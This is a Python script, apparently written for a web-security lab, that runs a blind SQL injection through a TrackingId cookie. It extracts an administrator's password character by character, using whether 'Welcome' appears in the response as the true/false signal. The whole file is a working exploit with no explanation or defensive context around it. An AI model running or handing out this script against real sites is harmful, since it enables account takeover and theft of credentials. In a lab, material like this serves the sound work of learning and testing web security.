import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def sqli_password(url,trackingId,session):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username = 'administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':trackingId + sqli_payload_encoded,
                       'session': session}
            try:
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                if "Welcome" not in r.text:  # Fixed typo in "Welcome"
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
                else:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
            except requests.exceptions.ProxyError as e:
                print("\nProxy Error: Unable to connect to the proxy.")
                print("Make sure your proxy URL is correct and supports HTTP.")
                return
            except requests.exceptions.SSLError as e:
                print("\nSSL Error: There was an issue with the SSL connection.")
                print("Make sure the target URL supports HTTPS or change the URL to use HTTP.")
                return

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        
    #url = sys.argv[1]
    url = input("Enter Url: ")
    session = input("Enter Session: ")
    trackingId = input("Enter TrackingID: ")
    print("(+) Retrieving administrator password....")
    sqli_password(url,trackingId,session)

if __name__ == "__main__":
    main()
